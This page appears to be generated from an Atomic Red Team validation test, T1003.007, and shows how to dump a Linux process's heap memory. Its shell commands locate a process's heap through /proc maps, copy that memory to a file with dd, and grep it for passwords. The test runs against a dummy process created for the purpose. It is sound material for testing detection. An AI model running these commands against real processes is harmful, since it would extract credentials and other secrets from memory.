---
atomic_guid: "7e91138a-8e74-456d-a007-973d67a0bb80"
title: "Dump individual process memory with sh (Local)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.007"
attack_technique_name: "OS Credential Dumping: Proc Filesystem"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.yaml"
build_date: "2026-04-26 14:38:39"
executor: "sh"
aliases:
  - "7e91138a-8e74-456d-a007-973d67a0bb80"
  - "Dump individual process memory with sh (Local)"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Dump individual process memory with sh (Local)

Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
copy process memory to an external file so it can be searched or exfiltrated later.

## Metadata

- Atomic GUID: 7e91138a-8e74-456d-a007-973d67a0bb80
- Technique: T1003.007: OS Credential Dumping: Proc Filesystem
- Platforms: linux
- Executor: sh
- Elevation Required: True
- Source Path: atomics/T1003.007/T1003.007.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.007]]

## Input Arguments

### output_file

- description: Path where captured results will be placed
- type: path
- default: /tmp/T1003.007.bin

### pid_term

- description: Unique string to use to identify target process
- type: string
- default: T1003.007

### script_path

- description: Path to script generating the target process
- type: path
- default: /tmp/T1003.007.sh

## Dependencies

Script to launch target process must exist

### Prerequisite Check

```text
test -f #{script_path}
grep "#{pid_term}" #{script_path}
```

### Get Prerequisite

```text
echo '#!/bin/sh' > #{script_path}
echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
```

## Executor

- elevation_required: True
- name: sh

### Command

```sh
sh #{script_path}
PID=$(pgrep -n -f "#{pid_term}")
HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
grep -i "PASS" "#{output_file}"
```

### Cleanup

```sh
rm -f "#{output_file}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.yaml)
